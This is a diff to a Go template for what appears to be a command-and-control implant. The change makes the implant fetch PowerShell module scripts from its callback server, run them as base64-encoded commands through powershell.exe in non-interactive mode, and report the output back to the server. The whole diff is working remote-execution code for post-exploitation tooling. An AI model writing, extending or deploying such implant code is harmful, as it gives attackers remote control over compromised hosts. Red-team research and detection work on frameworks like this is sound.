@@ -863,7 +863,105 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	fmt.Printf("[DEBUG] Executing module: id=%s, module=%s\n", taskID, moduleID)
 	{{end}}
 	
-	// Execute embedded module
+	// Extract parameters from task
+	var params map[string]string
+	if p, ok := task["parameters"].(map[string]interface{}); ok {
+		params = make(map[string]string)
+		for k, v := range p {
+			if str, ok := v.(string); ok {
+				params[k] = str
+			} else {
+				params[k] = fmt.Sprintf("%v", v)
+			}
+		}
+	} else {
+		params = make(map[string]string)
+	}
+	
+	// For PowerShell modules, execute via PowerShell.exe dynamically
+	// This allows modules to be executed without embedding them in the payload
+	if strings.Contains(moduleID, "powershell/") {
+		// This is a PowerShell module - we need to fetch and execute it
+		// For now, send a request to the server to get the module script
+		{{if .Debug}}
+		fmt.Printf("[DEBUG] PowerShell module detected, fetching script from server\n")
+		{{end}}
+		
+		// Request module script from server
+		client := &http.Client{Timeout: 30 * time.Second}
+		req, err := http.NewRequest("GET", callbackURL+"/module/"+moduleID, nil)
+		if err != nil {
+			sendResult("module", taskID, fmt.Sprintf("Error creating module request: %v", err))
+			return
+		}
+		
+		sessionMu.Lock()
+		if sessionID != "" {
+			req.Header.Set("X-Session-ID", sessionID)
+		}
+		sessionMu.Unlock()
+		req.Header.Set("User-Agent", userAgent)
+		
+		resp, err := client.Do(req)
+		if err != nil {
+			sendResult("module", taskID, fmt.Sprintf("Error fetching module: %v", err))
+			return
+		}
+		defer resp.Body.Close()
+		
+		if resp.StatusCode != 200 {
+			body, _ := io.ReadAll(resp.Body)
+			sendResult("module", taskID, fmt.Sprintf("Module fetch failed (status %d): %s", resp.StatusCode, string(body)))
+			return
+		}
+		
+		var moduleResponse map[string]interface{}
+		if err := json.NewDecoder(resp.Body).Decode(&moduleResponse); err != nil {
+			sendResult("module", taskID, fmt.Sprintf("Error decoding module response: %v", err))
+			return
+		}
+		
+		script, ok := moduleResponse["script"].(string)
+		if !ok {
+			sendResult("module", taskID, "Module response missing script")
+			return
+		}
+		
+		// Build PowerShell command with parameters
+		scriptWithParams := script
+		if len(params) > 0 {
+			// Add parameters to script
+			var paramParts []string
+			for k, v := range params {
+				if k == "session_id" || k == "Agent" {
+					continue
+				}
+				if v == "True" || v == "False" {
+					paramParts = append(paramParts, fmt.Sprintf("-%s", k))
+				} else {
+					paramParts = append(paramParts, fmt.Sprintf("-%s \"%s\"", k, v))
+				}
+			}
+			if len(paramParts) > 0 {
+				scriptWithParams = script + "\n" + strings.Join(paramParts, " ")
+			}
+		}
+		
+		// Execute PowerShell script
+		encodedScript := base64.StdEncoding.EncodeToString([]byte(scriptWithParams))
+		cmd := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-EncodedCommand", encodedScript)
+		output, err := cmd.CombinedOutput()
+		
+		if err != nil {
+			result := fmt.Sprintf("Error: %v\nOutput: %s", err, string(output))
+			sendResult("module", taskID, result)
+		} else {
+			sendResult("module", taskID, string(output))
+		}
+		return
+	}
+	
+	// Fallback for embedded modules (if any)
 	{{if .ModuleCode}}
 	// Module code is embedded
 	{{.ModuleCode}}
@@ -873,15 +971,15 @@ func executeModule(taskID, moduleID string, task map[string]interface{}) {
 	switch sanitizedID {
 	{{range .Modules}}
 	case "{{sanitizeModuleID .}}":
-		result := executeModule_{{sanitizeModuleID .}}(task["params"].(map[string]string))
+		result := executeModule_{{sanitizeModuleID .}}(params)
 		sendResult("module", taskID, result)
 	{{end}}
 	default:
 		sendResult("module", taskID, "Module function not found")
 	}
 	{{else}}
-	// No modules embedded
-	sendResult("module", taskID, "Module not embedded")
+	// No modules embedded and not PowerShell - module not available
+	sendResult("module", taskID, "Module not available (not PowerShell and not embedded)")
 	{{end}}
 }
 
